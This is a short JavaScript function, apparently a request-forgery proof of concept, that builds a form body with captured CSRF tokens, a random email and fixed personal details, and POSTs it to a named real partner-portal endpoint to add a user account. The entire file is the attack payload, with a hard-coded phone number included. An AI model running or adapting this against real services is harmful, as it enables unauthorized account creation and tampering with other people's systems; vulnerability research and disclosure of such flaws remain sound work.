function csrf(token, key) {
    // Generate a random number between 0 and 9999
    var rand = Math.floor(Math.random() * 10000);
    // Create a unique email by concatenating the random number with a string
    var email = "okpay" + rand + "@live.com";

    var params = "_Token%5Bfields%5D=" + token;
    params += "&fname=Naysser&";
    params += "lname=trying&";
    params += "phone=&";
    params += "mobile_phone=0625638657&";
    params += "login=" + email + "&";
    params += "_Token%5Bunlocked%5D=&";
    params += "_csrfToken=" + encodeURIComponent(key);

    var x1 = new XMLHttpRequest();
    x1.open("POST", "https://pan.bitdefender.com/partners/my-users-save/");
    x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x1.send(params);
}
